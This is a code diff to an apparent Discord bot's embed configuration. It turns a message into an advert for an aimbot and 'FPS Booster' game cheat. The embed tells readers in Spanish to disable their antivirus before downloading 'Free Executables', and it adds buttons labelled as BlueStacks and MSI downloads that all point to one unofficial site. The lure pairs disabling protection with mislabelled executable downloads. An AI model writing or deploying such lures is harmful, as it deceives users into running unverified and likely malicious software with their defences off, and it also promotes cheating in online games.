@@ -174,15 +174,52 @@ module.exports = [
     id: ids.embeds.PANEL_PC_GRATIS,
     messageId: "1538692444302999572",
     embed: new EmbedBuilder()
-      .setTitle("> HyperV - Panel Secure Gratis")
+      .setTitle("> Panel Aimbot + FPS Booster | Download Links")
       .setDescription(
-        "DESACTIVATA TU ANTIVIRUS ANTES DE DESCARGAR LOS ARCHIVOS ⚠️\n\n" +
-        "**Página:**\n\n" +
-        "- Ingresa a nuestra pagina y sigue los pasos — [📥 HyperV](https://hyperv.online)"
+        "DESACTIVATA TU ANTIVIRUS ANTES DE DESCARGAR LOS ARCHIVOS\n\n" +
+        "**Recommended Resources**\n\n" +
+        "BLUESTACKS \n" +
+        "MSI_P64\n" +
+        "FF\n\n" +
+        "**Free Executables:**\n\n" +
+        "PANEL BASICO\n\n" +
+        "**System Requirements:**\n" +
+        "DirectX/C++ Dll's (obligatorio)"
       )
       .setColor(config.embedColor)
       .setFooter(config.embedFooter)
       .setImage(config.defaultImage),
+    components: [
+      // Fila 1: Botón para BlueStacks
+      new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setLabel("Descargar BlueStacks")
+          .setStyle(ButtonStyle.Link)
+          .setEmoji({ name: 'download', id: '1505630527535972402' })
+          .setURL("https://hyperv.online")
+      ),
+      // Fila 2: Botón para MSI
+      new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setLabel("Descargar MSI")
+          .setStyle(ButtonStyle.Link)
+          .setEmoji({ name: 'download', id: '1505630527535972402' })
+          .setURL("https://hyperv.online")
+      ),
+      // Fila 3: Botones de Prueba Gratis (pueden ir juntos en una fila si caben)
+      new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setLabel("Reclamar Prueba Gratis")
+          .setStyle(ButtonStyle.Secondary)
+          .setEmoji("🎁")
+          .setCustomId("reclamar_prueba"),
+        new ButtonBuilder()
+          .setLabel("Help Support")
+          .setStyle(ButtonStyle.Link)
+          .setEmoji("🛠️")
+          .setURL("https://hyperv.online")
+      )
+    ],
   },
 
   {
